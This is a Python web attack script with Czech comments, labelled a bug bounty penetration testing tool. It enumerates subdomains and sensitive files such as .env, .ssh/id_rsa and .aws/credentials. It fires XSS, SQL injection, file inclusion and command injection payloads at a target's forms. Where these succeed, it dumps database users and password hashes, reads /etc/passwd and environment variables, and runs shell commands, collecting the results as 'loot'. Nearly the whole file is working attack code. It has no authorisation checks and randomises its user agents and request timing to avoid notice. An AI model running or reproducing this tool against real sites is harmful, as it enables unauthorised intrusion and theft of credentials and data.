#!/usr/bin/env python3
import requests
import json
import time
import random
import argparse
import socket
import threading
import re
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urljoin, urlparse
from bs4 import BeautifulSoup
from rich.console import Console
from rich.table import Table
from rich.progress import Progress, SpinnerColumn, TextColumn
from rich.panel import Panel
from rich import print as rprint

# --- KONFIGURACE ---
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
]
# Rozšířený slovník pro subdomény
SUBDOMAIN_WORDLIST = ["www", "mail", "ftp", "admin", "test", "dev", "api", "blog", "shop", "staging", "old", "new", "db", "cpanel", "webmail", "secure", "vpn", "portal", "autodiscover", "ns1", "ns2", "smtp", "pop3", "imap", "m", "mobile", "direct", "support", "billing", "client", "members"]
# Payloady pro "tichý" sběr dat
XSS_PAYLOAD = "<script>alert('XSS')</script>"
SQLI_PAYLOADS = ["'", "' OR '1'='1", "\" OR \"1\"=\"1", "'; SELECT SLEEP(5)--"]
SQLI_TIME_PAYLOADS = ["'; SELECT SLEEP(5)--", "'; WAITFOR DELAY '0:0:5'--", "\") OR SLEEP(5)--"]
LFI_PAYLOADS = ["../../../../etc/passwd", "../../../../proc/version", "../../../../etc/hostname", "C:\\Windows\\win.ini", ".env", "wp-config.php", "config.php", "web.config"]
RCE_PAYLOADS = ["; sleep 5", "| sleep 5", "`sleep 5`", "& sleep 5", "$(sleep 5)"]
OPEN_REDIRECT_PAYLOAD = "//evil.com"
# Common directories for dirbusting
COMMON_DIRS = ["/admin", "/login", "/dashboard", "/config", "/backup", "/.git", "/.env", "/phpinfo.php", "/server-status", "/wp-admin", "/adminer.php", "/phpmyadmin", "/test", "/dev", "/api", "/v1", "/v2", "/.git/config", "/.vscode", "/.ssh", "/backup.zip", "/config.php.bak", "/db.php.bak", "/.htaccess", "/robots.txt", "/sitemap.xml", "/assets", "/dist", "/build"]

# --- GLOBÁLNÍ PROMĚNNÉ PRO UKLÁDÁNÍ ---
HARVESTED_DATA = {
    "target": "",
    "ip_address": "",
    "subdomains": [],
    "technologies": [],
    "emails": [],
    "interesting_files": [],
    "api_endpoints": [],
    "vulnerabilities": [],
    "js_secrets": [],
    "security_headers": {},
    "cors_misconfig": False,
    "loot": []
}
console = Console()

# --- POMOCNÉ FUNKCE ---
def get_random_headers():
    return {'User-Agent': random.choice(USER_AGENTS), 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'}

def delay_request():
    time.sleep(random.uniform(0.5, 2.0))

# --- FÁZE 1: PRŮZKUM ---
def get_ip_address(url):
    try:
        domain = urlparse(url).netloc
        return socket.gethostbyname(domain)
    except socket.gaierror:
        return "N/A"

def enumerate_subdomains(domain, session, threads=10):
    found_subdomains = set()
    base_domain = domain.replace('https://', '').replace('http://', '').split('/')[0]
    
    def check_subdomain(word):
        subdomain = f"https://{word}.{base_domain}"
        try:
            r = session.get(subdomain, headers=get_random_headers(), timeout=3, allow_redirects=True)
            if r.status_code < 400:
                console.print(f"[+] Found subdomain: [cyan]{subdomain}[/cyan] (Status: {r.status_code})")
                return subdomain
        except requests.RequestException:
            pass
        return None

    with Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}"), console=console, transient=True) as progress:
        task = progress.add_task(f"[yellow]Enumerating subdomains for {base_domain}...", total=len(SUBDOMAIN_WORDLIST))
        with ThreadPoolExecutor(max_workers=threads) as executor:
            future_to_word = {executor.submit(check_subdomain, word): word for word in SUBDOMAIN_WORDLIST}
            for future in as_completed(future_to_word):
                result = future.result()
                if result:
                    found_subdomains.add(result)
                progress.advance(task)
    return list(found_subdomains)

def discover_technologies(url, session):
    tech = set()
    try:
        r = session.get(url, headers=get_random_headers(), timeout=10)
        content = r.text.lower()
        headers = r.headers
        
        # Detekce z hlaviček
        if 'x-powered-by' in headers:
            tech.add(f"Powered-By: {headers['x-powered-by']}")
        if 'server' in headers:
            tech.add(f"Server: {headers['server']}")
            
        # Detekce z obsahu (zjednodušená Wappalyzer logika)
        if 'wp-content' in content or 'wp-includes' in content:
            tech.add("WordPress")
        if 'joomla' in content:
            tech.add("Joomla")
        if 'drupal' in content:
            tech.add("Drupal")
        if 'generator" content="shopify' in content:
            tech.add("Shopify")
        if 'src="/static/' in content or 'href="/static/' in content:
            tech.add("Possible Python Framework (Django/Flask)")
    except requests.RequestException:
        pass
    return list(tech)

def discover_hidden_parameters(url, session):
    hidden_params = set()
    common_params = ["debug", "admin", "test", "dev", "cmd", "exec", "file", "path", "url", "id", "user", "pass", "config"]
    try:
        # Check if the page behaves differently with these params
        orig_r = session.get(url, headers=get_random_headers(), timeout=10)
        orig_len = len(orig_r.text)

        for param in common_params:
            test_url = f"{url}?{param}=1" if '?' not in url else f"{url}&{param}=1"
            r = session.get(test_url, headers=get_random_headers(), timeout=10)
            if len(r.text) != orig_len:
                hidden_params.add(param)
    except:
        pass
    return list(hidden_params)

def crawl_website(url, session, max_pages=100):
    visited = set()
    to_visit = [url]
    found_urls = set([url])
    while to_visit and len(visited) < max_pages:
        current = to_visit.pop(0)
        if current in visited:
            continue
        visited.add(current)
        try:
            r = session.get(current, headers=get_random_headers(), timeout=10)
            soup = BeautifulSoup(r.text, 'html.parser')
            for link in soup.find_all('a', href=True):
                full_url = urljoin(current, link['href'])
                if urlparse(full_url).netloc == urlparse(url).netloc and full_url not in found_urls:
                    found_urls.add(full_url)
                    if full_url not in visited:
                        to_visit.append(full_url)
        except requests.RequestException:
            pass
    return list(found_urls)

def analyze_javascript(url, session):
    secrets = []
    endpoints = set()
    # Common regex for secrets
    patterns = {
        "API Key": r"(?:key|api_key|apikey|secret|token)[\s:=]+[\"']([a-zA-Z0-9_\-]{16,})[\"']",
        "Firebase URL": r"https://[a-z0-9\-]+\.firebaseio\.com",
        "Generic Secret": r"(?:secret|token|password|auth|creds)[\s:=]+[\"']([a-zA-Z0-9_\-\.]{10,})[\"']"
    }
    try:
        r = session.get(url, headers=get_random_headers(), timeout=10)
        soup = BeautifulSoup(r.text, 'html.parser')
        js_files = [urljoin(url, script['src']) for script in soup.find_all('script', src=True)]

        for js_url in js_files:
            try:
                js_res = session.get(js_url, headers=get_random_headers(), timeout=10)
                content = js_res.text

                for name, pattern in patterns.items():
                    matches = re.findall(pattern, content, re.IGNORECASE)
                    for match in matches:
                        secrets.append({"type": name, "file": js_url, "value": match})

                # Hidden endpoints
                found_eps = re.findall(r"['\"](/[a-zA-Z0-9_\-/]+)['\"]", content)
                for ep in found_eps:
                    if len(ep) > 1:
                        endpoints.add(ep)
            except:
                pass
    except:
        pass
    return secrets, list(endpoints)

def check_cors(url, session):
    try:
        headers = get_random_headers()
        headers['Origin'] = 'https://evil.com'
        r = session.get(url, headers=headers, timeout=10)
        allow_origin = r.headers.get('Access-Control-Allow-Origin', '')
        if allow_origin == '*' or allow_origin == 'https://evil.com':
            return True
    except:
        pass
    return False

def extract_loot_lfi(url, session, inputs, method):
    looted = []
    sensitive_files = ["/etc/passwd", ".env", "wp-config.php", "config.php", "/etc/hosts", "/proc/self/environ"]
    for s_file in sensitive_files:
        test_data = {k: s_file for k in inputs.keys()}
        try:
            res = session.post(url, data=test_data, headers=get_random_headers(), timeout=10) if method == 'post' else session.get(url, params=test_data, headers=get_random_headers(), timeout=10)
            if len(res.text) > 0 and (any(ind in res.text for ind in ["root:", "DB_", "PASSWORD", "localhost"]) or len(res.text) > 500):
                content_preview = res.text[:200].replace('\n', ' ')
                looted.append({"source": "LFI", "file": s_file, "content": content_preview})
        except:
            pass
    return looted

def extract_loot_sqli(url, session, inputs, method):
    looted = []
    # Payloads to extract basic info
    extraction_payloads = {
        "Database User": "' UNION SELECT user(),1,1,1--",
        "Database Version": "' UNION SELECT version(),1,1,1--",
        "Database Name": "' UNION SELECT database(),1,1,1--",
        "Tables": "' UNION SELECT table_name,1,1,1 FROM information_schema.tables--",
        "Users": "' UNION SELECT user,password,1,1 FROM mysql.user--"
    }
    for name, payload in extraction_payloads.items():
        test_data = {k: payload for k in inputs.keys()}
        try:
            res = session.post(url, data=test_data, headers=get_random_headers(), timeout=10) if method == 'post' else session.get(url, params=test_data, headers=get_random_headers(), timeout=10)
            # Simplified check for exfiltrated data
            if any(ind in res.text for ind in ["root", "5.", "8.", "information_schema"]):
                 looted.append({"source": "SQLi", "type": name, "payload": payload, "content": "Extracted sensitive DB info"})
            else:
                looted.append({"source": "SQLi", "type": name, "payload": payload})
        except:
            pass
    return looted

def extract_loot_rce(url, session, inputs, method):
    looted = []
    rce_commands = {
        "User Info": "whoami; id",
        "System Info": "uname -a; hostname",
        "Network Info": "ifconfig || ip a",
        "Process List": "ps aux",
        "Environment": "env"
    }
    for name, cmd in rce_commands.items():
        # Using a simple command execution payload - adjust based on what worked in detection
        payload = f"; {cmd} #"
        test_data = {k: payload for k in inputs.keys()}
        try:
            res = session.post(url, data=test_data, headers=get_random_headers(), timeout=15) if method == 'post' else session.get(url, params=test_data, headers=get_random_headers(), timeout=15)
            if len(res.text) > 0:
                looted.append({"source": "RCE", "type": name, "command": cmd, "content": res.text[:500].replace('\n', ' ')})
        except:
            pass
    return looted

def discover_sensitive_files(url, session):
    loot = []
    high_value_files = [
        ".env", ".git/config", "wp-config.php", "config.php",
        "backup.sql", "db.sql", ".aws/credentials", ".ssh/id_rsa",
        "server.key", "config.yml", "docker-compose.yml", ".htaccess"
    ]
    for s_file in high_value_files:
        test_url = urljoin(url, s_file)
        try:
            r = session.get(test_url, headers=get_random_headers(), timeout=5)
            if r.status_code == 200:
                content = r.text.lower()
                # Basic check if it's actually sensitive content and not a 404-turned-200 or default page
                if any(ind in content for ind in ["db_", "password", "key", "aws_", "ssh-rsa", "repository"]) or len(r.text) > 200:
                    console.print(f"[bold red][!] Sensitive file discovered and exfiltrated: {test_url}[/bold red]")
                    loot.append({"source": "Discovery", "file": test_url, "content": r.text[:200].replace('\n', ' ')})
        except:
            pass
    return loot

def check_security_headers(headers):
    audit = {}
    important = ['Content-Security-Policy', 'Strict-Transport-Security', 'X-Frame-Options', 'X-Content-Type-Options', 'Referrer-Policy']
    for header in important:
        if header in headers:
            audit[header] = headers[header]
        else:
            audit[header] = "MISSING"
    return audit

def extract_emails_and_files(url, session):
    emails = set()
    files = set()
    api_endpoints = set()
    try:
        r = session.get(url, headers=get_random_headers(), timeout=10)
        soup = BeautifulSoup(r.text, 'html.parser')

        # Emaily
        for mailto in soup.select('a[href^="mailto:"]'):
            email = mailto['href'].replace('mailto:', '')
            emails.add(email)

        # Zajímavé soubory (pdf, doc, xls)
        for link in soup.find_all('a', href=True):
            href = link['href'].lower()
            if any(ext in href for ext in ['.pdf', '.doc', '.docx', '.xls', '.xlsx']):
                full_url = urljoin(url, link['href'])
                files.add(full_url)
            if '/api/' in href:
                api_endpoints.add(urljoin(url, href))

    except requests.RequestException:
        pass
    return list(emails), list(files), list(api_endpoints)

def check_robots_and_sitemap(url, session):
    robots_url = urljoin(url, '/robots.txt')
    sitemap_url = urljoin(url, '/sitemap.xml')
    robots_content = ""
    sitemap_content = ""
    try:
        r = session.get(robots_url, headers=get_random_headers(), timeout=10)
        if r.status_code == 200:
            robots_content = r.text
    except:
        pass
    try:
        r = session.get(sitemap_url, headers=get_random_headers(), timeout=10)
        if r.status_code == 200:
            sitemap_content = r.text
    except:
        pass
    return robots_content, sitemap_content

def check_ssl_and_headers(url, session):
    ssl_info = "Not HTTPS"
    headers_info = {}
    try:
        r = session.get(url, headers=get_random_headers(), timeout=10)
        headers_info = dict(r.headers)
        if url.startswith("https"):
            ssl_info = "HTTPS enabled"
            # Check for HSTS, etc.
            if 'Strict-Transport-Security' in headers_info:
                ssl_info += " (HSTS present)"
            else:
                ssl_info += " (No HSTS)"
        else:
            ssl_info = "HTTP only - vulnerable to MITM"
    except:
        pass
    return ssl_info, headers_info

def dir_bust(url, session, wordlist, threads=10, baseline=None):
    exposed_dirs = []

    def check_dir(word):
        test_url = urljoin(url, word)
        try:
            r = session.get(test_url, headers=get_random_headers(), timeout=5)
            # Baseline check to avoid false positives (e.g., all 404s returning 200 with same size)
            if baseline and r.status_code == baseline['status'] and abs(len(r.text) - baseline['size']) < 100:
                return None

            if r.status_code < 400:
                content = r.text.lower()
                # Additional heuristic filter
                if not any(default in content for default in ["404", "not found"]) or len(content) > 2000:
                    console.print(f"[red]Exposed: [cyan]{test_url}[/cyan] (Status: {r.status_code}, Size: {len(r.text)})")
                    return {"url": test_url, "status": r.status_code, "size": len(r.text)}
        except requests.RequestException:
            pass
        return None

    with Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}"), console=console, transient=True) as progress:
        task = progress.add_task(f"[yellow]Dirbusting {url}...", total=len(wordlist))
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = [executor.submit(check_dir, word) for word in wordlist]
            for future in as_completed(futures):
                result = future.result()
                if result:
                    exposed_dirs.append(result)
                progress.advance(task)
    return exposed_dirs

# --- FÁZE 2: SKENOVÁNÍ A ÚTOK ---
def scan_and_exploit(url, session):
    vulnerabilities = []
    try:
        r = session.get(url, headers=get_random_headers(), timeout=10)
        soup = BeautifulSoup(r.text, 'html.parser')

        # Sken formulářů
        forms = soup.find_all('form')
        for form in forms:
            action = form.get('action')
            method = form.get('method', 'get').lower()
            form_url = urljoin(url, action)
            inputs = {inp.get('name'): 'test' for inp in form.find_all('input') if inp.get('name')}

            # XSS Test
            test_data = {k: XSS_PAYLOAD for k in inputs.keys()}
            res = session.post(form_url, data=test_data, headers=get_random_headers(), timeout=10) if method == 'post' else session.get(form_url, params=test_data, headers=get_random_headers(), timeout=10)
            if XSS_PAYLOAD in res.text:
                vulnerabilities.append({"type": "XSS", "url": form_url, "payload": XSS_PAYLOAD, "method": method, "details": "Reflected XSS found in form."})
                delay_request()
                continue

            # SQLi Test (Error-based)
            for payload in SQLI_PAYLOADS:
                test_data = {k: payload for k in inputs.keys()}
                try:
                    res = session.post(form_url, data=test_data, headers=get_random_headers(), timeout=10) if method == 'post' else session.get(form_url, params=test_data, headers=get_random_headers(), timeout=10)
                    if any(error in res.text.lower() for error in ["sql", "mysql", "syntax", "database"]):
                        vulnerabilities.append({"type": "SQLi (Error)", "url": form_url, "payload": payload, "method": method, "details": "Possible SQL injection vulnerability."})
                        HARVESTED_DATA["loot"].extend(extract_loot_sqli(form_url, session, inputs, method))
                        break
                except:
                    pass
                delay_request()

            # SQLi Test (Time-based)
            for payload in SQLI_TIME_PAYLOADS:
                test_data = {k: payload for k in inputs.keys()}
                try:
                    start_time = time.time()
                    res = session.post(form_url, data=test_data, headers=get_random_headers(), timeout=15) if method == 'post' else session.get(form_url, params=test_data, headers=get_random_headers(), timeout=15)
                    duration = time.time() - start_time
                    if duration >= 5:
                        vulnerabilities.append({"type": "SQLi (Time)", "url": form_url, "payload": payload, "method": method, "details": f"Possible Blind SQLi (Duration: {duration:.2f}s)"})
                        break
                except:
                    pass
                delay_request()

            # LFI Test
            for payload in LFI_PAYLOADS:
                test_data = {k: payload for k in inputs.keys()}
                try:
                    res = session.post(form_url, data=test_data, headers=get_random_headers(), timeout=10) if method == 'post' else session.get(form_url, params=test_data, headers=get_random_headers(), timeout=10)
                    if any(indicator in res.text for indicator in ["root:x:0:0", "bin:x:1:1", "[extensions]", "boot loader", "DB_PASSWORD", "AWS_SECRET_ACCESS_KEY"]):
                        vulnerabilities.append({"type": "LFI", "url": form_url, "payload": payload, "method": method, "details": "Local File Inclusion found."})
                        HARVESTED_DATA["loot"].extend(extract_loot_lfi(form_url, session, inputs, method))
                        break
                except:
                    pass
                delay_request()

            # RCE Test (Time-based)
            for payload in RCE_PAYLOADS:
                test_data = {k: payload for k in inputs.keys()}
                try:
                    start_time = time.time()
                    res = session.post(form_url, data=test_data, headers=get_random_headers(), timeout=15) if method == 'post' else session.get(form_url, params=test_data, headers=get_random_headers(), timeout=15)
                    duration = time.time() - start_time
                    if duration >= 5:
                        vulnerabilities.append({"type": "RCE", "url": form_url, "payload": payload, "method": method, "details": f"Potential Remote Code Execution found via time delay ({duration:.2f}s)."})
                        HARVESTED_DATA["loot"].extend(extract_loot_rce(form_url, session, inputs, method))
                        break
                except:
                    pass
                delay_request()

            # Open Redirect Test
            test_data = {k: OPEN_REDIRECT_PAYLOAD for k in inputs.keys()}
            try:
                res = session.post(form_url, data=test_data, headers=get_random_headers(), timeout=10, allow_redirects=False) if method == 'post' else session.get(form_url, params=test_data, headers=get_random_headers(), timeout=10, allow_redirects=False)
                if 'location' in res.headers and 'evil.com' in res.headers['location']:
                    vulnerabilities.append({"type": "Open Redirect", "url": form_url, "payload": OPEN_REDIRECT_PAYLOAD, "method": method, "details": "Open redirect vulnerability."})
            except:
                pass
            delay_request()

    except Exception as e:
        print(f"Error during scan: {e}")
    return vulnerabilities

def save_report(data, filepath):
    try:
        with open(filepath, "w") as f:
            json.dump(data, f, indent=4)
        console.print(f"\n[bold green]Results saved to {filepath}[/bold green]")
    except Exception as e:
        console.print(f"[red]Error saving report: {e}[/red]")

def run_scan(target_url, threads=10, proxy=None, output_file=None):
    session = requests.Session()
    if proxy:
        session.proxies = {"http": proxy, "https": proxy}

    # Phase 1: Reconnaissance
    console.print("[bold green]Phase 1: Reconnaissance[/bold green]")
    HARVESTED_DATA["target"] = target_url
    HARVESTED_DATA["ip_address"] = get_ip_address(target_url)
    HARVESTED_DATA["subdomains"] = enumerate_subdomains(target_url, session, threads=threads)
    HARVESTED_DATA["technologies"] = discover_technologies(target_url, session)
    emails, files, apis = extract_emails_and_files(target_url, session)
    HARVESTED_DATA["emails"] = emails
    HARVESTED_DATA["interesting_files"] = files
    HARVESTED_DATA["api_endpoints"] = apis
    HARVESTED_DATA["all_urls"] = crawl_website(target_url, session, max_pages=50)  # Increased to 50 pages
    robots, sitemap = check_robots_and_sitemap(target_url, session)
    HARVESTED_DATA["robots_txt"] = robots
    HARVESTED_DATA["sitemap_xml"] = sitemap

    # Establish baseline for 404s
    baseline = None
    try:
        random_path = f"/{random.randint(100000, 999999)}_not_found"
        r_base = session.get(urljoin(target_url, random_path), headers=get_random_headers(), timeout=5)
        baseline = {"status": r_base.status_code, "size": len(r_base.text)}
        console.print(f"[dim]Established 404 baseline: Status {baseline['status']}, Size {baseline['size']}[/dim]")
    except:
        pass

    HARVESTED_DATA["exposed_dirs"] = dir_bust(target_url, session, COMMON_DIRS, threads=threads, baseline=baseline)
    ssl_info, headers_info = check_ssl_and_headers(target_url, session)
    HARVESTED_DATA["ssl_info"] = ssl_info
    HARVESTED_DATA["headers"] = headers_info

    # Advanced Reco
    js_secrets, js_endpoints = analyze_javascript(target_url, session)
    HARVESTED_DATA["js_secrets"] = js_secrets
    HARVESTED_DATA["api_endpoints"].extend(js_endpoints)
    HARVESTED_DATA["security_headers"] = check_security_headers(headers_info)
    HARVESTED_DATA["cors_misconfig"] = check_cors(target_url, session)

    # Hidden Parameter Discovery
    hidden_params = discover_hidden_parameters(target_url, session)
    if hidden_params:
        console.print(f"[yellow][!] Found hidden parameters: {', '.join(hidden_params)}[/yellow]")
        for p in hidden_params:
            HARVESTED_DATA["api_endpoints"].append(f"{target_url}?{p}=")

    # Sensitive File Discovery
    HARVESTED_DATA["loot"].extend(discover_sensitive_files(target_url, session))

    # Phase 2: Scanning and Exploitation
    console.print("[bold red]Phase 2: Scanning and Exploitation[/bold red]")
    all_vulns = []
    # Scan main page
    all_vulns.extend(scan_and_exploit(target_url, session))
    # Scan some crawled pages for forms (limit to 5)
    for page in HARVESTED_DATA["all_urls"][:5]:
        all_vulns.extend(scan_and_exploit(page, session))
    HARVESTED_DATA["vulnerabilities"] = all_vulns

    # Save report if requested
    if output_file:
        save_report(HARVESTED_DATA, output_file)

    # Display results in organized sections
    console.print("\n[bold blue]=== SCAN RESULTS ===[/bold blue]")

    # Basic Info
    ssl = HARVESTED_DATA.get("ssl_info", "Unknown")
    panel = Panel(f"Target: {HARVESTED_DATA['target']}\nIP: {HARVESTED_DATA['ip_address']}\nSSL: {ssl}\nTechnologies: {', '.join(HARVESTED_DATA['technologies']) if HARVESTED_DATA['technologies'] else 'None'}",
                  title="Basic Information", border_style="green")
    console.print(panel)

    # Discovered URLs
    urls = HARVESTED_DATA.get("all_urls", [])
    if urls:
        url_list = "\n".join(urls)
        panel = Panel(url_list, title=f"Discovered URLs ({len(urls)} total)", border_style="blue")
        console.print(panel)

    # Exposed Directories
    exposed = HARVESTED_DATA.get("exposed_dirs", [])
    if exposed:
        exp_list = "\n".join(f"{e['url']} (Status: {e['status']}, Size: {e['size']})" for e in exposed)
        panel = Panel(exp_list, title="Exposed Directories/Files", border_style="red")
        console.print(panel)

    # Emails and Files
    emails = HARVESTED_DATA.get("emails", [])
    files = HARVESTED_DATA.get("interesting_files", [])
    apis = HARVESTED_DATA.get("api_endpoints", [])
    info = f"Emails: {', '.join(emails) if emails else 'None'}\nFiles: {', '.join(files) if files else 'None'}\nAPIs: {', '.join(apis) if apis else 'None'}"
    panel = Panel(info, title="Extracted Data", border_style="yellow")
    console.print(panel)

    # Vulnerabilities
    vulns = HARVESTED_DATA.get("vulnerabilities", [])
    if vulns:
        vuln_list = "\n".join(f"- {v['type']} at {v['url']} ({v['details']})" for v in vulns)
        panel = Panel(vuln_list, title=f"Vulnerabilities Found ({len(vulns)})", border_style="red", style="bold red")
        console.print(panel)
    else:
        console.print("[green]No vulnerabilities found.[/green]")

    # Other
    subdomains = HARVESTED_DATA.get("subdomains", [])
    if subdomains:
        panel = Panel("\n".join(subdomains), title="Subdomains", border_style="cyan")
        console.print(panel)

    robots = HARVESTED_DATA.get("robots_txt", "")
    if robots:
        panel = Panel(robots[:500] + "..." if len(robots) > 500 else robots, title="Robots.txt", border_style="magenta")
        console.print(panel)

    sitemap = HARVESTED_DATA.get("sitemap_xml", "")
    if sitemap:
        panel = Panel(sitemap[:500] + "..." if len(sitemap) > 500 else sitemap, title="Sitemap.xml", border_style="magenta")
        console.print(panel)

    # JS Secrets
    js_secrets = HARVESTED_DATA.get("js_secrets", [])
    if js_secrets:
        sec_list = "\n".join(f"- {s['type']} in {s['file']}" for s in js_secrets)
        panel = Panel(sec_list, title="JS Secrets Found", border_style="bold red")
        console.print(panel)

    # Security Headers
    sec_headers = HARVESTED_DATA.get("security_headers", {})
    if sec_headers:
        header_audit = "\n".join(f"{k}: {v}" for k, v in sec_headers.items())
        panel = Panel(header_audit, title="Security Headers Audit", border_style="yellow")
        console.print(panel)

    # CORS
    if HARVESTED_DATA.get("cors_misconfig"):
        panel = Panel("CORS Misconfiguration: Access-Control-Allow-Origin allows evil.com or *", title="CORS Audit", border_style="red", style="bold red")
        console.print(panel)

    # Loot
    loot = HARVESTED_DATA.get("loot", [])
    if loot:
        loot_str = "\n".join(f"- [{l['source']}] Found: {l.get('file') or l.get('type')} -> {l.get('content', 'Data extracted')}" for l in loot)
        panel = Panel(loot_str, title="Loot / Exfiltrated Data", border_style="bold green")
        console.print(panel)

    # Headers
    headers = HARVESTED_DATA.get("headers", {})
    if headers:
        header_str = "\n".join(f"{k}: {v}" for k, v in headers.items())
        panel = Panel(header_str, title="Response Headers", border_style="white")
        console.print(panel)

def interactive_menu():
    while True:
        console.print("\n[bold cyan]Penetration Testing Tool Menu[/bold cyan]")
        console.print("[1] Scan a website")
        console.print("[2] Exit")
        choice = input("Choose an option: ").strip()
        if choice == "1":
            url = input("Enter target URL (e.g., https://example.com): ").strip()
            if url:
                run_scan(url)
            else:
                console.print("[red]Invalid URL.[/red]")
        elif choice == "2":
            console.print("[green]Exiting...[/green]")
            break
        else:
            console.print("[red]Invalid choice. Try again.[/red]")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Bug Bounty Penetration Testing Tool")
    parser.add_argument("-t", "--target", help="Target URL (e.g., https://example.com)")
    parser.add_argument("-w", "--threads", type=int, default=10, help="Number of threads (default: 10)")
    parser.add_argument("-o", "--output", help="Output JSON file path")
    parser.add_argument("-p", "--proxy", help="Proxy URL (e.g., http://127.0.0.1:8080)")

    args = parser.parse_args()

    if args.target:
        run_scan(args.target, threads=args.threads, proxy=args.proxy, output_file=args.output)
    else:
        interactive_menu()